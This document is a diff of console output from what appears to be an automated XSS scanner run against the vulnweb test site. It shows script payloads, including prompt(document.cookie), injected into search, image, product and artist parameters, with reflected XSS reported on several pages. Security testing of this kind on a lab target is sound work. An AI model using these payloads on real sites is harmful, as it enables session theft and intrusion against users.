-[[1;33m06:50:12[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/cart.php
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Form key name: [1;32mprice[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Form key name: [1;32maddcart[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Internal error: 'name'
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Parameter page using (POST) payloads but not 100% yet...
-[[1;33m06:50:12[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:12[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:13[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:13[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
-[[1;33m06:50:13[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/1.jpg[0m Maybe a vuln XSS point
-[[1;33m06:50:13[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>prompt(document.cookie)</script>
-[[1;33m06:50:13[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:13[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:13[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
-[[1;33m06:50:13[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:13[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:14[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:10[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/artists.php?artist=1
+[[1;33m09:42:11[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:11[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:11[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:11[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:11[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:11[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:11[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:11[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:11[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:11[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:11[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:12[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:12[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:12[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:12[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:12[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
 [1;37m***************
-[[1;33m06:50:14[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/listproducts.php?cat=2
-[[1;33m06:50:15[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:15[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:15[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:15[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:15[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:15[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:15[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:15[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
-[[1;33m06:50:15[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=6[0m Maybe a vuln XSS point
-[[1;33m06:50:15[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>prompt(document.cookie)</script>
-[[1;33m06:50:15[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:16[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:16[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/6.jpg[0m Maybe a vuln XSS point
-[[1;33m06:50:16[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>prompt(document.cookie)</script>
-[[1;33m06:50:16[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:16[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:16[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
-[[1;33m06:50:16[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:16[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:17[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
-[[1;33m06:50:17[0m] [[1;33mWARNING[0m] Found link with query: [1;32mcat=2[0m Maybe a vuln XSS point
-[[1;33m06:50:17[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=<script>prompt(document.cookie)</script>
-[[1;33m06:50:17[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:18[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
+[[1;33m09:42:14[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/listproducts.php?artist=1
+[[1;33m09:42:15[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:15[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:15[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:15[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:15[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:15[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:16[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:16[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:16[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=1[0m Maybe a vuln XSS point
+[[1;33m09:42:16[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>console.log(5000/3000)</script>
+[[1;33m09:42:16[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:16[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:16[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/1.jpg[0m Maybe a vuln XSS point
+[[1;33m09:42:16[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>console.log(5000/3000)</script>
+[[1;33m09:42:16[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:17[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:17[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:17[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:17[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:17[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:17[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:17[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:17[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:18[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:18[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=2[0m Maybe a vuln XSS point
+[[1;33m09:42:18[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>console.log(5000/3000)</script>
+[[1;33m09:42:18[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:19[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:19[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/2.jpg[0m Maybe a vuln XSS point
+[[1;33m09:42:19[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>console.log(5000/3000)</script>
+[[1;33m09:42:19[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:20[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:20[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:20[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:20[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:21[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:21[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:21[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:21[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:21[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:21[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=3[0m Maybe a vuln XSS point
+[[1;33m09:42:21[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>console.log(5000/3000)</script>
+[[1;33m09:42:21[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:22[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:22[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/3.jpg[0m Maybe a vuln XSS point
+[[1;33m09:42:22[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>console.log(5000/3000)</script>
+[[1;33m09:42:22[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:22[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:22[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:22[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:22[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:23[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:23[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:23[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:23[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:24[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:24[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=4[0m Maybe a vuln XSS point
+[[1;33m09:42:24[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>console.log(5000/3000)</script>
+[[1;33m09:42:24[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:24[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:24[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/4.jpg[0m Maybe a vuln XSS point
+[[1;33m09:42:24[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>console.log(5000/3000)</script>
+[[1;33m09:42:24[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:25[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:25[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:25[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:25[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:26[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:26[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:26[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:26[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:26[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:26[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=5[0m Maybe a vuln XSS point
+[[1;33m09:42:26[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>console.log(5000/3000)</script>
+[[1;33m09:42:26[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:27[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:27[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/5.jpg[0m Maybe a vuln XSS point
+[[1;33m09:42:27[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>console.log(5000/3000)</script>
+[[1;33m09:42:27[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:27[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:27[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:27[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:27[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:28[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:28[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:28[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:28[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:29[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:29[0m] [[1;33mWARNING[0m] Found link with query: [1;32mpic=6[0m Maybe a vuln XSS point
+[[1;33m09:42:29[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=<script>console.log(5000/3000)</script>
+[[1;33m09:42:29[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:29[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:29[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/6.jpg[0m Maybe a vuln XSS point
+[[1;33m09:42:29[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>console.log(5000/3000)</script>
+[[1;33m09:42:29[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:30[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:30[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:30[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:30[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:31[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:31[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
+[[1;33m09:42:31[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:31[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:31[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
 [1;37m***************
-[[1;33m06:50:18[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/product.php?pic=6
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
-[[1;33m06:50:19[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/cart.php
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Form key name: [1;32mprice[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Form key name: [1;32maddcart[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Internal error: 'name'
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Parameter page using (POST) payloads but not 100% yet...
-[[1;33m06:50:19[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Collecting form input key.....
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>prompt(document.cookie)</script>
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
-[[1;33m06:50:19[0m] [[1;32mINFO[0m] Sending payload (POST) method...
-[[1;33m06:50:20[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
-[[1;33m06:50:20[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>prompt(document.cookie)</script>', 'goButton': 'goButton'}
-[[1;33m06:50:20[0m] [[1;33mWARNING[0m] Found link with query: [1;32mfile=./pictures/6.jpg[0m Maybe a vuln XSS point
-[[1;33m06:50:20[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=<script>prompt(document.cookie)</script>
-[[1;33m06:50:20[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:20[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-[[1;33m06:50:20[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=1[0m Maybe a vuln XSS point
-[[1;33m06:50:20[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>prompt(document.cookie)</script>
-[[1;33m06:50:20[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
-[[1;33m06:50:21[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
+[[1;33m09:42:31[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/artists.php?artist=2
+[[1;33m09:42:32[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
+[[1;33m09:42:32[0m] [[1;33mWARNING[0m] Target have form with POST method: [1;36mhttp://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:32[0m] [[1;32mINFO[0m] Collecting form input key.....
+[[1;33m09:42:32[0m] [[1;32mINFO[0m] Form key name: [1;32msearchFor[0m value: [1;32m<script>console.log(5000/3000)</script>
+[[1;33m09:42:32[0m] [[1;32mINFO[0m] Form key name: [1;32mgoButton[0m value: [1;32m<Submit Confirm>
+[[1;33m09:42:32[0m] [[1;32mINFO[0m] Sending payload (POST) method...
+[[1;33m09:42:32[0m] [[1;31mCRITICAL[0m] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query
+[[1;33m09:42:32[0m] [[1;31mCRITICAL[0m] Post data: {'searchFor': '<script>console.log(5000/3000)</script>', 'goButton': 'goButton'}
+[[1;33m09:42:32[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=2[0m Maybe a vuln XSS point
+[[1;33m09:42:32[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:32[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:33[0m] [[1;31mCRITICAL[0m] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econsole.log(5000/3000)%3C/script%3E
+[[1;33m09:42:33[0m] [[1;33mWARNING[0m] Found link with query: [1;32martist=2[0m Maybe a vuln XSS point
+[[1;33m09:42:33[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=<script>console.log(5000/3000)</script>
+[[1;33m09:42:33[0m] [[1;32mINFO[0m] Query (GET) : http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+[[1;33m09:42:34[0m] [[1;32mINFO[0m] Parameter page using (GET) payloads but not 100% yet...
 [1;37m***************
-[[1;33m06:50:21[0m] [[1;32mINFO[0m] Checking connection to: [1;33mhttp://testphp.vulnweb.com/listproducts.php?cat=3
-[[1;33m06:50:21[0m] [[1;32mINFO[0m] Connection estabilished [1;32m200
